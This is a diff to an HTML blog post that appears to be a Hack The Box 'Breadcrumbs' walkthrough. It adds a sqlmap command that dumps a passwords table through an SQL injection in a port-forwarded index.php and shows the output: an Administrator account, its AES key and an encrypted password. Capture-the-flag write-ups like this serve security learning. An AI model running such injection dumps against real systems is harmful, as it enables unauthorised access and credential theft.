@@ -172,6 +172,10 @@ published: true
 
 <pre><span class="line">ssh -N -L 1234:127.0.0.1:1234 development@10.10.10.228</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/HTB/Breadcrumbs]</span><br><span class="line">└─<span class="comment"># curl 'http://127.0.0.1:1234/index.php?method=select&amp;username=administrator&amp;table=passwords'</span></span><br><span class="line">selectarray(1) {</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  array(1) {</span><br><span class="line">    [<span class="string">"aes_key"</span>]=&gt;</span><br><span class="line">    string(16) <span class="string">"k19D193j.&lt;19391("</span></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre>
 
+<p>Let`s ROLL</p>
+
+<pre><span class="line">sqlmap -u http://127.0.0.1:1234/index.php\?method\=select\&amp;username\=administrator\&amp;table\=passwords --dump</span><br><span class="line"></span><br><span class="line">Database: bread</span><br><span class="line">Table: passwords</span><br><span class="line">[1 entry]</span><br><span class="line">+----+---------------+------------------+----------------------------------------------+</span><br><span class="line">| id | account       | aes_key          | password                                     |</span><br><span class="line">+----+---------------+------------------+----------------------------------------------+</span><br><span class="line">| 1  | Administrator | k19D193j.&lt;19391( | H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= |</span><br><span class="line">+----+---------------+------------------+----------------------------------------------+</span><br></pre>
+
 
 
 
